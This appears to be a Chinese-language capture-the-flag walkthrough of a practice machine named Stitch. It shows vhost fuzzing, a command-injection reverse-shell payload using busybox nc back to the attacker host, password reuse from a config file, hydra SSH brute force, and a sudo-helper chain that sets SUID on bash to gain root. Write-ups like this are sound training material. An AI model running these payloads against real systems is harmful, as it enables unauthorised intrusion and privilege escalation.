# 一、信息收集

## 1. 主机发现

使用 `arp-scan` 对本地网段 `192.168.205.0/24` 进行扫描，发现目标主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:41:c8:f0       PCS Systemtechnik GmbH
...
```

确认目标IP地址为 `192.168.205.131`。

## 2. 端口扫描

使用 `nmap` 对目标主机进行全端口扫描，识别其开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.131
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

扫描结果显示目标开放了 **22 (SSH)** 和 **80 (HTTP)** 端口。

## 3. 子域名枚举

访问 `http://192.168.205.131`，在页面页脚发现一个联系邮箱 `support@stitch.dsz`。由此推断出主域名为 `stitch.dsz`。

我们将IP与主域名绑定在本地 `/etc/hosts` 文件中。

```bash
192.168.205.131 stitch.dsz
```

随后，使用 `wfuzz` 对主域名进行虚拟主机（VHost）爆破，发现了多个子域名。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ wfuzz -c -u "http://stitch.dsz" -H "HOST:FUZZ.stitch.dsz" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 1348
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000002:   200        60 L     163 W      1822 Ch     "mail - mail"
000004858:   200        61 L     132 W      1751 Ch     "dog - dog"
000049948:   200        225 L    549 W      7295 Ch     "iot - iot"
...
```

发现 `mail.stitch.dsz`, `dog.stitch.dsz`, 和 `iot.stitch.dsz` 三个子域名。将它们全部添加到 `/etc/hosts` 文件中以方便后续访问。

## 4. Web应用分析

经过对每个已发现子域的目录枚举和初步测试，我们将其关键特征和潜在攻击面总结如下：

*   **dog.stitch.dsz**: 一个图片上传页面。通过目录爆破发现 `/backup.zip`，源码分析表明其存在严格的MIME类型校验和图像二次渲染，难以直接利用上传漏洞。
*   **mail.stitch.dsz**: 一个静态邮件页面。目录爆破发现 `mail.php`，访问后发现该页面硬编码了对 `/etc/passwd` 文件的读取，导致了系统用户名列表的泄露。这并非通用文件读取漏洞，但为我们提供了关键的枚举信息。
*   **iot.stitch.dsz**: 一个物联网（IoT）设备登录面板。经过测试，此处的登录表单存在**命令注入**漏洞，是我们的主要突破口。

# 二、立足点

## 1. 命令注入漏洞

`iot.stitch.dsz` 的登录页面后端处理用户输入时未做严格过滤，导致在 `username` 参数中可以注入任意系统命令。

## 2. 获取反向Shell

我们利用该命令注入漏洞，让目标主机执行一条反弹shell的命令。

* **步骤一：在Kali攻击机上监听端口**

  ```bash
  ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
  └─$ nc -lvnp 8888
  ```

* **步骤二：构造并发送Payload**
  在 `iot` 登录页面的 `username` 输入框中填入以下经过URL编码的Payload，密码任意填写后提交。

  ```
  ;busybox nc 192.168.205.128 8888 -e $(which $(echo $0));
  ```

* **步骤三：成功接收Shell**
  Kali的监听端口成功接收到来自目标服务器的反向shell，当前用户为 `www-data`。

  ```bash
  listening on [any] 8888 ...
  connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 60340
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

* **步骤四：稳定Shell**

  ```bash
  script /dev/null -c bash
  Ctrl+Z
  stty raw -echo; fg
  reset xterm
  export TERM=xterm
  export SHELL=/bin/bash
  stty rows 24 columns 80
  ```

# 三、权限提升

## 1. 横向移动 (www-data -> iiiii)

在 `www-data` 用户的shell中，我们对Web目录进行探查，在 `dog` 子站点的配置文件中发现关键信息。

```bash
www-data@Stitch:/var/www/dog$ cat config.php
<?php
/*
 * IoT System Configuration File
 * Security Key: iiiii:3c4900896d92da
 * Last Updated: 2023-10-15
 */
// ... (其他配置)
?>
```

`config.php` 文件泄露了一个格式为 `username:password` 的安全密钥：`iiiii:3c4900896d92da`。

使用此凭据，我们成功从 `www-data` 切换到 `iiiii` 用户，并获取了第一个flag。

```bash
www-data@Stitch:/var/www/dog$ su iiiii
Password: 3c4900896d92da
iiiii@Stitch:/var/www/dog$ id
uid=1000(iiiii) gid=1000(iiiii) groups=1000(iiiii)
iiiii@Stitch:~$ cat /home/iiiii/user.txt
flag{user-265620fc-3eda-11f0-b71d-000c2955ba04}
```

## 2. 提权至Root (iiiii -> iotuser -> root)

这是一个多步骤的提权过程，需要结合两个用户的权限和系统配置才能完成。

* **步骤一：权限分析 (iiiii)**
  在 `iiiii` 用户下，使用 `sudo -l` 发现其可以无密码以root权限执行 `/usr/bin/push_iot`。通过 `strings` 分析该程序，得知其功能是将一个文件复制到 `/var/iot_scripts/` 目录，但要求源文件所有者必须是 `iotuser`，且权限为 `600`，拒绝软链。这个限制条件迫使我们必须先获得 `iotuser` 的控制权。

* **步骤二：横向移动 (iiiii -> iotuser)**
  我们回到之前发现的 `/var/www/dog/config.php` 文件，收集其中所有看起来像密码的硬编码字符串，创建一个自定义的密码字典。

  ```bash
  ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
  └─$ cat pass
  3c4900896d92da
  s3cur3P@ssw0rd!
  3c4900896d92da789abc
  sk_live_xyz123iiiii
  d3v!c3P@ss
  ```

使用这个字典和 `hydra` 工具，对 `iotuser` 的SSH服务进行密码爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ hydra -l iotuser -P pass ssh://192.168.205.131 -f -I -u -e nsr -t 64
...
[22][ssh] host: 192.168.205.131   login: iotuser   password: 3c4900896d92da
...
```

成功破解出 `iotuser` 的密码也是 `3c4900896d92da`。使用此密码通过SSH成功登录。

* **步骤三：提权路径发现 (iotuser)**
  登录 `iotuser` 后，再次执行 `sudo -l`，发现新线索：

  ```bash
  iotuser@Stitch:~$ sudo -l
  ...
  User iotuser may run the following commands on Stitch:
      (ALL) NOPASSWD: /usr/bin/iot_runner
  ```

  `iotuser` 可以无密码以root权限执行 `/usr/bin/iot_runner`，该脚本会执行位于 `/var/iot_scripts/` 目录下的指定脚本。至此，完整的提权链已经清晰：

  1.  以 `iotuser` 身份创建一个包含提权代码的恶意脚本。
  2.  以 `iiiii` 身份使用 `push_iot` 将此恶意脚本复制到 `/var/iot_scripts/`。
  3.  最后以 `iotuser` 身份使用 `iot_runner` 执行该脚本，完成提权。

* **步骤四：执行提权**

  1. **作为 `iotuser`**，在共享目录 `/dev/shm/` 下创建提权脚本 `a.sh`，内容为给 `bash` 添加SUID权限，并设置其权限为 `600` 以满足 `push_iot` 的检查条件。

     ```bash
     iotuser@Stitch:~$ vim /dev/shm/a.sh
     iotuser@Stitch:~$ cat /dev/shm/a.sh
     IOT#
     chmod +s /bin/bash
     iotuser@Stitch:~$ chmod 600 /dev/shm/a.sh
     ```

  2. **切换回 `iiiii` 用户**，执行 `push_iot` 命令。

     ```bash
     iiiii@Stitch:/tmp$ sudo /usr/bin/push_iot /dev/shm/a.sh
     All checks passed. Copying file...
     File successfully copied to /var/iot_scripts/a.sh
     ```

  3. **再次切换回 `iotuser`**，执行 `iot_runner` 触发payload。

     ```bash
     iotuser@Stitch:~$ sudo /usr/bin/iot_runner a.sh
     Checking script: /var/iot_scripts/a.sh
     Verification passed.:
     ```

  4. 检查 `/bin/bash` 权限，发现已成功设置SUID位。执行 `bash -p` 获得root权限。

     ```bash
     iotuser@Stitch:~$ ls -al /bin/bash
     -rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
     iotuser@Stitch:~$ bash -p
     bash-5.0# id
     uid=1004(iotuser) gid=1004(iotuser) euid=0(root) egid=0(root) groups=0(root),1004(iotuser)
     ```

# 四、获取Flag

```bash
bash-5.0# id
uid=1004(iotuser) gid=1004(iotuser) euid=0(root) egid=0(root) groups=0(root),1004(iotuser)
bash-5.0# cat /root/root.txt /home/iiiii/user.txt 
flag{root-251f332a-3ed6-11f0-960d-000c2955ba04}
flag{user-265620fc-3eda-11f0-b71d-000c2955ba04}
```

至此，所有Flag均已找到，渗透测试完成。